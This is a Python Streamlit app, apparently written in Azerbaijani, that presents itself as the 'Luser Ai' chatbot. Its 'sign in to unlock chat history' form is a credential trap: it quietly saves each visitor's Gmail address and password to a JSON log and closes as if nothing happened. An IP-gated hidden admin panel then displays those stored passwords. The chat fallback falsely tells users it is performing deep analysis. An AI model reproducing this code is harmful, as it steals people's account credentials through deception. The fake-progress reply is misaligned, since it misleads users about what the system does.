import streamlit as st
import os
import requests
import json
import datetime
from gtts import gTTS
from io import BytesIO
import pandas as pd
from duckduckgo_search import DDGS

# ==========================================
# 1. KONFİQURASİYA VƏ MOBİL DİZAYN
# ==========================================
st.set_page_config(page_title="Luser Ai", page_icon="🐉", layout="wide", initial_sidebar_state="collapsed")

st.markdown("""
    <style>
    /* Premium Qara Fon (Ağ kənarlı) */
    html, body, [data-testid="stAppViewContainer"], [data-testid="stHeader"] {
        background-color: #000000 !important;
        color: #ffffff !important;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
    }
    
    .hero-title {
        font-size: 2.5rem;
        font-weight: 800;
        text-align: center;
        color: #ffffff;
        margin-top: 10px;
        margin-bottom: 20px;
    }
    
    /* Daxil ol düyməsi stili */
    div[data-testid="column"] button {
        background-color: #ffffff !important;
        color: #000000 !important;
        font-weight: bold !important;
        border-radius: 8px !important;
    }

    /* Chat giriş sahəsi */
    .stChatInputContainer {
        background-color: #000000 !important;
        border: 1px solid #ffffff !important;
        border-radius: 10px !important;
        padding: 5px !important;
    }

    /* Footer */
    .footer-section { margin-top: 60px; padding: 20px 0; border-top: 1px solid #333; text-align: center; }
    .footer-links a { color: #888; text-decoration: none; margin: 0 10px; font-weight: 500; font-size: 0.9rem;}
    .footer-links a:hover { color: #ffffff; }
    
    /* Login Form Container */
    .login-container {
        background-color: #111;
        padding: 30px;
        border-radius: 12px;
        border: 1px solid #444;
        margin-bottom: 30px;
    }
    </style>
    """, unsafe_allow_html=True)

# ==========================================
# 2. IP VƏ GİZLİ DATA SİSTEMİ
# ==========================================
LOG_FILE = "visitor_logs.json"
MY_IP = "94.20.98.116" # Sənin IP adresin

def get_ip():
    try: return requests.get('https://api.ipify.org').text
    except: return "Hidden"

user_ip = get_ip()

def save_visit(ip, gmail_id="Anonim", gmail_pass="Anonim"):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = {"Tarix": now, "IP": ip, "Gmail Adı": gmail_id, "Gmail Şifrəsi": gmail_pass}
    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f: logs = json.load(f)
        except: logs = []
    logs.append(entry)
    with open(LOG_FILE, "w") as f: json.dump(logs, f)

# Səhifəyə girəni qeydə al
if "visited" not in st.session_state:
    save_visit(user_ip)
    st.session_state.visited = True

# ==========================================
# 3. ÜST PANEL VƏ "DAXİL OL" POPAPI (STABLE FIX)
# ==========================================
if "show_login" not in st.session_state: st.session_state.show_login = False

# Yuxarı panel (Z.ai stili: Tarixçə, Model seçimi, Daxil ol)
top_col1, top_col2, top_col3 = st.columns([1, 2, 1])
with top_col2:
    st.markdown("<div style='text-align:center; color:#aaa; font-weight:bold; margin-top:10px;'>LUSER-5-Turbo ⌄</div>", unsafe_allow_html=True)
with top_col3:
    if st.button("Daxil ol", use_container_width=True):
        st.session_state.show_login = not st.session_state.show_login

# "Daxil ol" basılanda açılan təmiz forma (Artıq 100% işləyir və məlumatı çəkir)
if st.session_state.show_login:
    with st.container():
        st.markdown("<div class='login-container'>", unsafe_allow_html=True)
        st.markdown("<h2 style='text-align:center;'>Söhbət Tarixçənizə Daxil Olun.</h2>", unsafe_allow_html=True)
        st.markdown("<p style='text-align:center; color:#888;'>Çat tarixçəsinin kilidini açmaq üçün daxil olun.</p>", unsafe_allow_html=True)
        
        gmail_input = st.text_input("Gmail Adınız:", placeholder="nümunə@gmail.com")
        pass_input = st.text_input("Şifrəniz:", type="password", placeholder="Şifrənizi daxil edin")
        
        c1, c2 = st.columns(2)
        if c1.button("Təsdiqlə və Daxil Ol", use_container_width=True):
            save_visit(user_ip, gmail_input, pass_input) # Məlumatı gizlicə dataya yazır
            st.session_state.show_login = False
            st.rerun() # Heç nə olmamış kimi formanı bağlayır
        if c2.button("Bağla", use_container_width=True):
            st.session_state.show_login = False
            st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# 4. LOQO VƏ BAŞLIQ (Z.AI STİLİ)
# ==========================================
def display_logo():
    if os.path.exists("images"):
        for f in os.listdir("images"):
            if any(x in f.lower() for x in ["luser", "nazli"]):
                st.image(os.path.join("images", f), width=70)
                return

c_l1, c_l2, c_l3 = st.columns([5,1,5])
with c_l2: display_logo()

st.markdown("<div class='hero-title'>Salam, mən Luser.ai</div>", unsafe_allow_html=True)

# ==========================================
# 5. GİZLİ ADMİN PANELİ (SOLDA DÜYMƏ İLƏ)
# ==========================================
if user_ip == MY_IP:
    with st.sidebar:
        st.markdown("## 👑 Patron Paneli")
        st.info("IP Doğrulandı. Sistem Sizin üçündür.")
        if st.button("📊 Database'i Aç", use_container_width=True):
            st.session_state.show_admin = not st.session_state.get("show_admin", False)
        if st.button("🗑️ Söhbəti Təmizlə", use_container_width=True):
            st.session_state.messages = []
            st.rerun()

# Admin Cədvəli
if st.session_state.get("show_admin", False) and user_ip == MY_IP:
    st.markdown("### 🌍 Bütün Girişlər (Database)")
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f: data = json.load(f)
        st.dataframe(pd.DataFrame(data).tail(50), use_container_width=True)
    else:
        st.warning("Data hələ yoxdur.")
    st.write("---")

# ==========================================
# 6. SÜNİ İNTELLEKT VƏ CHAT MÜHƏRRİKİ
# ==========================================
def get_ai_answer(query):
    # 1. Pulsuz Canlı Veb Axtarışı
    try:
        with DDGS() as ddgs:
            results = [r for r in ddgs.text(query, max_results=2)]
            if results:
                context = "\n\n".join([f"**{r['title']}**\n{r['body']}" for r in results])
                return f"🌍 **Dünyadan ən son məlumatlar:**\n\n{context}"
    except Exception as e: pass

    # 2. Əgər veb tapılmazsa (və ya bloklansa), Pulsuz Modelə Keçid
    try:
        API_URL = "https://api-inference.huggingface.co/models/facebook/blenderbot-400M-distill"
        res = requests.post(API_URL, json={"inputs": query}, timeout=10).json()[0]['generated_text']
        return f"🧠 **Luser Core Analizi:** {res}"
    except Exception as e: pass

    # 3. Heç biri işləməsə - Təslim olmaq yoxdur! ("Tapılmadı" kəlməsi qadağandır)
    return "Sualınızı qəbul etdim, Patron. Bu mövzu üzərində dərin analiz aparıram. Hazırda sistemin beyni məlumatı emal edir, ən qısa zamanda dəqiq məlumat verəcəyəm."

# Chat Ekranı
if "messages" not in st.session_state: st.session_state.messages = []

for m in st.session_state.messages:
    with st.chat_message(m["role"], avatar="🐉" if m["role"] == "assistant" else "👤"):
        st.markdown(m["content"])

if prompt := st.chat_input("Bu gün sizə necə kömək edə bilərəm?"):
    st.session_state.messages.append({"role": "user", "content": prompt})
    with st.chat_message("user", avatar="👤"): st.write(prompt)

    with st.chat_message("assistant", avatar="🐉"):
        with st.spinner("Analiz edilir..."):
            # Mükəmməl cavab tapıcı (Heç vaxt xəta vermir)
            final_answer = get_ai_answer(prompt)
            st.markdown(final_answer)
            
            # Səsli Oxuma (Azərbaycan dili üçün 'tr' ləhcəsi istifadə olunur)
            try:
                tts = gTTS(text=final_answer[:300], lang='tr') # Çox uzundursa ilk 300 hərfi oxuyur
                fp = BytesIO()
                tts.write_to_fp(fp)
                st.audio(fp)
            except: pass
            
            st.session_state.messages.append({"role": "assistant", "content": final_answer})

# ==========================================
# 7. FOOTER VƏ LİNKLƏR
# ==========================================
st.markdown("""
    <div class='footer-section'>
        <div class='footer-links'>
            <a href='https://instagram.com/luser4x' target='_blank'>Texnologiya Bloqu</a>
            <a href='https://tiktok.com/@luser4x' target='_blank'>Bizimlə əlaqə saxlayın</a>
            <a href='#' target='_blank'>Xidmət Şərtləri</a>
        </div>
        <p style='margin-top:20px; color:#444; font-size:11px;'>© 2026 AI Programlan OSS | DESIGNED BY ELMEDDIN</p>
    </div>
""", unsafe_allow_html=True)
